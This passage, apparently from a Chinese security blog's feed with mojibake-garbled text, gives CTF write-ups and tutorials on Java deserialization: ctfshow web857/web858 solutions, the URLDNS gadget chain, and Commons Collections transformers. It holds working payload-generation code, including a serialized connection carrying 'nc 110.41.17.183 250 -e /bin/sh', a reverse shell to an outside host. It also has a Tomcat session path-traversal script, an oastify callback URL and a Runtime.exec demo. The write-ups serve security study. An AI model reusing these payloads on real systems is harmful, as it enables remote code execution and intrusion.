aClass.getDeclaredField(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">        port.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        port.set(connection,<span class="number">3306</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">user</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        user.set(connection,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;yso_CommonsCollections4_nc 110.41.17.183 250 -e /bin/sh&quot;</span>,<span class="string">&quot;123456&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">schema</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;schema&quot;</span>);</span><br><span class="line">        schema.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        schema.set(connection,<span class="string">&quot;jdbc:mysql&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">database</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;database&quot;</span>);</span><br><span class="line">        database.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        database.set(connection,<span class="string">&quot;detectCustomCollations=true&amp;autoDeserialize=true&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(connection);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web857">web857</h2><p><a href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p><p>postgresql</p><ul><li>42.3.x &lt; 42.3.3</li><li>42.1.x</li></ul><p>ä½¿ç”¨æŒ‡å®šçš„connectionå’Œuserç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web856</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Connection</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> connection.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">host</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">        host.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        host.set(connection,<span class="string">&quot;110.41.17.183&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">port</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">        port.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        port.set(connection,<span class="number">3306</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">user</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        user.set(connection,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;yso_CommonsCollections4_nc 110.41.17.183 250 -e /bin/sh&quot;</span>,<span class="string">&quot;123456&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">schema</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;schema&quot;</span>);</span><br><span class="line">        schema.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        schema.set(connection,<span class="string">&quot;jdbc:mysql&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">database</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;database&quot;</span>);</span><br><span class="line">        database.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        database.set(connection,<span class="string">&quot;detectCustomCollations=true&amp;autoDeserialize=true&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(connection);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web858">web858</h2><p>tomcat sessionååºåˆ—åŒ–</p><p>Apache Tomcat: 10.0.0-M1 to 10.0.0-M4</p><p>Apache Tomcat: 9.0.0.M1 to 9.0.34</p><p>Apache Tomcat: 8.5.0 to 8.5.54</p><p>Apache Tomcat: 7.0.0 to 7.0.103</p><p>ç®€å•æ¥è¯´å°±æ˜¯ç”Ÿæˆä¸€ä¸ªa.sessionï¼Œå½“cookieè®¾ç½®ä¸ºaç›®å½•çš„æ—¶å€™ï¼Œå°±ä¼šååºåˆ—åŒ–a.sessionä¼ å…¥çš„å†…å®¹</p><p>æ¼æ´ä½ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.username);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨åªéœ€è¦ä¼ ä¸ª<code>a.session</code>è¿‡å»ï¼Œå†å¸¦ç€<code>JSESSIONID</code>è®¿é—®å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&#x27;http://eee0fb6c-b57e-4a67-b479-2decd1034e97.challenge.ctf.show/&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">&quot;JSESSIONID&quot;</span>:<span class="string">&quot;../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/a&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url=url,cookies=cookies)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>è®¿é—®url/flag.txtæ‹¿åˆ°flag</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>javaååºåˆ—åŒ–ä¹‹URLDNS</title>
    <link href="https://bowuchuling.github.io/posts/1830i0jy.html"/>
    <id>https://bowuchuling.github.io/posts/1830i0jy.html</id>
    <published>2024-04-06T05:44:18.948Z</published>
    <updated>2024-04-06T05:46:22.446Z</updated>
    
    <content type="html"><![CDATA[<h1>URLDNS</h1><p>å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªç±»è¿›è¡Œååºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨è¯¥ç±»çš„readObjectæ–¹æ³•ï¼Œ</p><p>Demo serializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//Person person = new Person(&quot;username&quot;,11);</span></span><br><span class="line">        <span class="comment">//System.out.println(person);</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚ï¼ŒæŠŠurlå¯¹è±¡çš„hashcodeæ”¹æˆä¸æ˜¯-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://jm97wyv7516bpv5b21bar09naeg54u.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demo unserializeTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//Person person = (Person) unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">        <span class="comment">//System.out.println(person);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> HashMap-&gt;readObject()</span><br><span class="line"><span class="number">2.</span> HashMap-&gt;hash()</span><br><span class="line"><span class="number">3.</span> URL-&gt;hashCode()</span><br><span class="line"><span class="number">4.</span> URLStreamHandler-&gt;hashCode()</span><br><span class="line"><span class="number">5.</span> URLStreamHandler-&gt;getHostAddress()</span><br><span class="line"><span class="number">6.</span> InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure><p>ç”±äºè¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥ä¼šè§¦å‘ååºåˆ—åŒ–ç±»çš„readObjectæ–¹æ³•ï¼Œè°ƒç”¨äº†hashæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¸ª</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160634829.png" alt="image-20240330160634829"></p><p>è°ƒç”¨hashcodeæ–¹æ³•ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯urlï¼Œæ‰€ä»¥ç›´æ¥æ‰¾urlç±»çš„hashcodeæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160723106.png" alt="image-20240330160723106"></p><p>æ³¨æ„åˆ¤æ–­ï¼Œå¦‚æœhashcodeç­‰äº-1ï¼Œæ‰ä¼šè°ƒç”¨this.handler.hashCode</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160743661.png" alt="image-20240330160743661"></p><p>è¿›å…¥hashcodeæ–¹æ³•ï¼Œå‘ç°è°ƒç”¨äº†getHostAddressï¼Œå‚æ•°å³æˆ‘ä»¬è¦å‘é€dnsè¯·æ±‚çš„åœ°å€</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330160844591.png" alt="image-20240330160844591"></p><p>è°ƒç”¨getbyNameæ–¹æ³•ï¼Œå‘é€dnsè¯·æ±‚</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240330161058024.png" alt="image-20240330161058024"></p><p>åœ¨ä½†ç»™mapè¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œä¼šç”¨åˆ°putæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406133851080.png" alt="image-20240406133851080"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406133857208.png" alt="image-20240406133857208"></p><p>putæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œè¿›è€Œå°†æ•´æ¡é“¾å­èµ°äº†ä¸€éï¼Œå¯¼è‡´hashcodeä¸ä¸º-1</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240406133922526.png" alt="image-20240406133922526"></p><p>å°±å¯¼è‡´åœ¨è¿™é‡Œä¸ä¼šè§¦å‘hashcodeï¼Œè¿›è€Œæ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–å‰æˆ‘ä»¬éœ€è¦å°†hashcodeåå°„èµ‹å€¼å›-1ï¼Œè¿™æ ·æ‰æœ‰äº†æˆ‘ä»¬ä¸Šè¾¹çš„é‚£æ¡é“¾å­</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CCé“¾ ååºåˆ—åŒ–</title>
    <link href="https://bowuchuling.github.io/posts/1837cccc.html"/>
    <id>https://bowuchuling.github.io/posts/1837cccc.html</id>
    <published>2024-04-04T18:20:11.346Z</published>
    <updated>2024-04-04T18:24:58.035Z</updated>
    
    <content type="html"><![CDATA[<h1>CCé“¾ ååºåˆ—åŒ–</h1><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401202109805.png" alt="image-20240401202109805"></p><h2 id="CCé“¾ç®€ä»‹">CCé“¾ç®€ä»‹</h2><p>Apache Commons æ˜¯å¯¹ JDK çš„æ‹“å±•ï¼ŒåŒ…å«äº†å¾ˆå¤šå¼€æºçš„å·¥å…·ï¼Œç”¨äºè§£å†³å¹³æ—¶ç¼–ç¨‹ç»å¸¸ä¼šé‡åˆ°çš„é—®é¢˜ã€‚Apache Commons å½“ä¸­æœ‰ä¸€ä¸ªç»„ä»¶å«åš Apache Commons Collectionsï¼Œå°è£…äº† Java çš„ Collection ç›¸å…³ç±»å¯¹è±¡ã€‚CCé“¾ ç¼–å†™çš„æ˜¯æµ‹è¯•ä»£ç ï¼Œå’Œ ysoserial ä¸­çš„ç¨æœ‰ä¸åŒã€‚ ä¸‹é¢çš„æ˜¯ç»å¸¸ç”¨åˆ°çš„ éå¸¸é‡è¦ çš„Transformeræ¥å£çš„å®ç°ç±»ã€‚</p><h3 id="ConstantTransformer">ConstantTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transform æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯è·å–ä¸€ä¸ªå¯¹è±¡ç±»å‹ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (constantToReturn == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> NULL_INSTANCE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//é‡å†™çš„transformæ–¹æ³•ï¼Œè·å–ä¸€ä¸ªå¯¹è±¡ç±»å‹</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="InvokerTransformer">InvokerTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transform æ–¹æ³•ã€‚å…¶ transform æ–¹æ³•ä½œç”¨æ˜¯åå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•å¹¶è¿”å›æ–¹æ³•è°ƒç”¨ç»“æœï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[]</span></span><br><span class="line"><span class="params">            args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é‡å†™çš„ transform æ–¹æ³•ï¼Œåå°„è°ƒç”¨æŒ‡å®šçš„æ–¹æ³•å¹¶è¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName,</span><br><span class="line">                        <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> â€¦â€¦â€¦â€¦</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Demoï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ‹è¯• InvokerTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        transformer2.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###è¾“å‡º</span><br><span class="line">å¼¹å‡ºè®¡ç®—å™¨</span><br></pre></td></tr></table></figure><h3 id="InstantiateTransformer">InstantiateTransformer</h3><p>Transformer æ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™äº†å…¶æ¥å£ç±»çš„ transform 